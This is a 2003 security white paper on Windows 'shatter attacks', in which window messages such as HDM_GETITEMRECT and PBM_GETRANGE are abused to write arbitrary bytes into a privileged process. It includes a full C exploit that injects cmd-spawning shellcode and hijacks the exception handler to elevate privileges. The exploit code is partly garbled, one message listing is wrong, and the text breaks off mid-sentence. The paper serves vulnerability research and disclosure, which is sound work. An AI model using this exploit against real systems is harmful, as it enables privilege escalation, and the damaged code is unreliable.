Copyright Security-Assessment.com Ltd 2003 
White Paper 
Title: Shattering By Example. 
Prepared by: 
Brett Moore 
Network Intrusion Specialist 
Security-Assessment.com 
Date:  
October 2003 
03/10/2003 
Page 2 of 19  
Copyright Security-Assessment.com Ltd 2003 
Abstract 
‘Shatter attack’ is a term used to describe attacks against the Windows GUI 
environment that allow a user to inject code into another process through the use 
of windows messages. 
This document includes technical examples written in C and is not meant to cover 
the basics of these attacks. We recommend that the following documents have 
been read to give an understanding of the background of these attacks. 
• 
Shatter Attacks - How to break Windows – Chris Paget 
http://security.tombom.co.uk/shatter.html 
• 
Win32 Message Vulnerabilities Redux - Oliver Lavery 
http://www.idefense.com/idpapers/Shatter_Redux.pdf 
Summary 
Previous shatter attacks have been based on the use of messages that accept a 
pointer as a parameter. This pointer directs execution flow to data that has been 
supplied by the attacker, therefore allowing the attacker to have a process 
execute code of their choice. 
Several windows message will accept a pointer to a callback function as one of 
the parameters to the SendMessage API. One of these is LVM_SORTITEMS, as 
shown below; 
Message 
LVM_SORTITEMS 
Description 
Uses an application-defined comparison function to sort the 
items of a list view control.  
Called As 
SendMessage( 
(HWND) hWndControl,               // handle to control 
(UINT) LVM_SORTITEMS,  // message ID 
wParam = (WPARAM) (LPARAM) lParamSort;  
lParam = (LPARAM) (PFNLVCOMPARE) pfnCompare; 
Parameters 
lParamSort  
Application-defined value that is passed to the 
comparison function.  
pfnCompare  
Address of the application-defined comparison 
function. The comparison function is called during the 
sort operation each time the order needs to be 
compared. 
The attack methods described in this document use messages that at first glance 
appear safe, but as we will show can be used to write arbitrary values to a 
process’s memory space leading to command execution. These techniques allow 
a low level user to overwrite important memory locations in a SYSTEM process 
such as data structures and structured exception handlers. 
03/10/2003 
Page 3 of 19  
Copyright Security-Assessment.com Ltd 2003 
(Rect*) Overwrite 
Various windows messages accept a pointer to a POINT or RECT structure which 
will be used to retrieve GDI information about windows. These pointers do not 
appear to be validated in any way. 
We will concentrate on the HDM_GETITEMRECT message. 
Message 
HDM_GETITEMRECT 
Description 
Retrieves the bounding rectangle for a given item in a header 
control. 
Called As 
SendMessage( 
(HWND) hWndControl,               // handle to control 
(UINT) HDM_GETITEMRECT,  // message ID 
(WPARAM) wParam,      // = (WPARAM) (int) iIndex; 
(LPARAM) lParam );       // = (LPARAM) (RECT*) 
Parameters 
wParam 
Zero-based index of the header control item for which 
to retrieve the bounding rectangle. 
lParam 
Pointer to a RECT structure that receives the bounding 
rectangle information. 
By passing an arbitrary value as the lParam value, the receiving process will write 
the resulting RECT data to a memory location of our choosing. 
For example, if we wanted to overwrite the Unhandled Exception Filter at 
0x77EDXXXX we would call 
  SendMessage(hwnd,HDM_GETITEMRECT,0,0x77EDXXXX) 
To control what is been written to the address we need to look at the format of the 
receiving structure. For the HDM_GETITEMRECT message a pointer to a RECT 
structure is passed. 
Structure 
RECT 
Definition 
typedef struct _RECT { 
LONG left; 
LONG top; 
LONG right; 
LONG bottom; 
} RECT, *PRECT; 
The RECT structure consists of 4 consecutive long values. If we passed the 
address 0x00024030, the resulting write would look like this. 
A = Left, B = Top, C = Right, D = Bottom 
By setting the width of the first column of a Listview control, we are in control of 
the left value of the second column. We can use the least significant byte of the 
returned left value, to overwrite memory space byte by byte. 
If we wanted to write the value 0x58, we would set the width of the first column to 
0x58 and then send the HDM_GETITEMRECT. The address specified would be  
overwritten as; 
03/10/2003 
Page 4 of 19  
Copyright Security-Assessment.com Ltd 2003 
By doing one write and then incrementing our write address, we are able to write 
a string of controlled bytes to a controlled memory location.  
This location could be program read/write data space, or something application 
global like TEB/PEB space.  
This method can be use to write shellcode to a known writeable address.  
After this, execution flow can be redirected through overwriting the SEH handler 
with the data address, and then causing an exception. 
We are able to automate the sizing of the listview columns by sending the 
LVM_SETCOLUMNWIDTH message. 
Message 
LVM_SETCOLUMNWIDTH 
Description 
Changes the width of a column in report-view mode or the 
width of all columns in list-view mode. 
Called As 
SendMessage( 
(HWND) hWndControl,        // handle to control 
(UINT) LVM_SETCOLUMNWIDTH,  // message ID 
(WPARAM) wParam,             // = (WPARAM) (int) iCol 
(LPARAM) lParam   MAKELPARAM ((int) cx, 0)); 
Parameters 
WParam 
Zero-based index of a valid column. 
lParam 
New width of the column, in pixels 
By passing the byte that we want to write as the lParam parameter to set the size, 
when HDM_GETITEMRECT is called our byte will be written to our specified 
memory address. 
This method has been proven to work against Tab controls as well using the 
following message pair; 
            TCM_SETITEMSIZE 
            TCM_GETITEMRECT 
03/10/2003 
Page 5 of 19  
Copyright Security-Assessment.com Ltd 2003 
(Rect*) Overwrite 
Example Against 
The Listview 
Control 
/********************************************************** 
* shatterseh2.c 
* 
* Demonstrates the use of listview messages to; 
*    - inject shellcode to known location 
*    - overwrite 4 bytes of a critical memory address 
* 
* 3 Variables need to be set for proper execution. 
*    - tWindow is the title of the programs main window 
*    - sehHandler is the critical address to overwrite 
*    - shellcodeaddr is the data space to inject the code 
* The 'autofind' feature may not work against all programs. 
* Try it out against any program with a listview. 
*   eg: explorer, IE, any file open dialog 
* 
* Brett Moore [ PI:EMAIL ] 
* www.security-assessment.com 
**********************************************************/ 
#include  
#include  
// Local Cmd Shellcode 
BYTE exploit[] = 
"\x90\x68\x63\x6d\x64\x00\x54\xb9\xc3\xaf\x01\x78\xff\xd1\xcc"; 
long hLVControl,hHdrControl; 
char tWindow[]="Main Window Title";// The name of the main window 
long sehHandler = 0x77edXXXX;      // Critical Address To Overwrite 
long shellcodeaddr = 0x0045e000;   // Known Writeable Space Or Global Space 
void doWrite(long tByte,long address); 
void IterateWindows(long hWnd); 
int main(int argc, char *argv[]) 
{ 
   long hWnd; 
   HMODULE hMod; 
   DWORD ProcAddr; 
   printf("%% Playing with listview messages\n"); 
   printf("%% PI:EMAIL\n\n"); 
   // Find local procedure address 
   hMod = LoadLibrary("msvcrt.dll"); 
   ProcAddr = (DWORD)GetProcAddress(hMod, "system"); 
   if(ProcAddr != 0) 
      // And put it in our shellcode 
      *(long *)&exploit[8] = ProcAddr; 
   printf("+ Finding %s Window...\n",tWindow); 
   hWnd = FindWindow(NULL,tWindow); 
   if(hWnd == NULL) 
   { 
      printf("+ Couldn't Find %s Window\n",tWindow); 
03/10/2003 
Page 6 of 19  
Copyright Security-Assessment.com Ltd 2003 
      return 0; 
   } 
   printf("+ Found Main Window At...0x%xh\n",hWnd); 
   IterateWindows(hWnd); 
   printf("+ Not Done...\n"); 
   return 0; 
} 
void doWrite(long tByte,long address) 
{ 
   SendMessage((HWND) hLVControl,(UINT) LVM_SETCOLUMNWIDTH, 
0,MAKELPARAM(tByte, 0)); 
   SendMessage((HWND) hHdrControl,(UINT) HDM_GETITEMRECT,1,address); 
} 
void IterateWindows(long hWnd) 
{ 
   long childhWnd,looper; 
   childhWnd = GetNextWindow(hWnd,GW_CHILD); 
   while (childhWnd != NULL) 
   { 
      IterateWindows(childhWnd); 
      childhWnd = GetNextWindow(childhWnd ,GW_HWNDNEXT); 
   } 
   hLVControl = hWnd; 
   hHdrControl = SendMessage((HWND) hLVControl,(UINT) LVM_GETHEADER, 
0,0); 
   if(hHdrControl != NULL) 
   { 
      // Found a Listview Window with a Header 
      printf("+ Found listview window..0x%xh\n",hLVControl); 
      printf("+ Found lvheader window..0x%xh\n",hHdrControl); 
      // Inject shellcode to known address 
      printf("+ Sending shellcode to...0x%xh\n",shellcodeaddr); 
      for (looper=0;looper> 8) & 0xff),sehHandler+1); 
      doWrite(((shellcodeaddr >> 16) & 0xff),sehHandler+2); 
      doWrite(((shellcodeaddr >> 24) & 0xff),sehHandler+3); 
      // Cause exception 
      printf("+ Forcing Unhandled Exception\n"); 
      SendMessage((HWND) hHdrControl,(UINT) HDM_GETITEMRECT,0,1); 
      printf("+ Done...\n"); 
      exit(0); 
   } 
} 
03/10/2003 
Page 7 of 19  
Copyright Security-Assessment.com Ltd 2003 
(PBRange*) 
Overwrite 
The progress bar control allows for the use of the PBM_GETRANGE message to 
retrieve the minimum and maximum range. 
Message 
PBM_GETRANGE 
Description 
Retrieves information about the current high and low limits of a 
given progress bar control. 
Called As 
SendMessage( 
(HWND) hWndControl,        // handle to control 
(UINT) PBM_GETRANGE,      // message ID 
(WPARAM) wParam,      // = (WPARAM)  
(LPARAM) lParam);      // =  (PPBRANGE) ppBRange;    
Parameters 
lParam 
Pointer to a PBRANGE structure that is to be filled with 
the high and low limits of the progress bar control. 
The lParam parameter of this message is not validated before been written to, 
allowing us to overwrite memory address’s in a similar manner as described in the 
section above. 
The pairing message used to set our written byte is PBM_SETRANGE. 
Message 
PBM_SETRANGE 
Description 
Sets the minimum and maximum values for a progress bar and 
redraws the bar to reflect the new range. 
Called As 
SendMessage( 
(HWND) hWndControl,        // handle to control 
(UINT) PBM_GETRANGE,      // message ID 
(WPARAM) wParam,      // = (WPARAM)  
(LPARAM) lParam    // = MAKELPARAM (nMinRange, 
                                                                  MaxRange)    
Parameters 
lParam 
Min and Max Range of the progress bar. 
Under certain circumstances, it may be possible to use this method against the 
windows installer service, to elevate privileges. 
In many cases it dumps system rights and runs as the user - but it does  
quite often run as system.  For example with group policy deployed apps  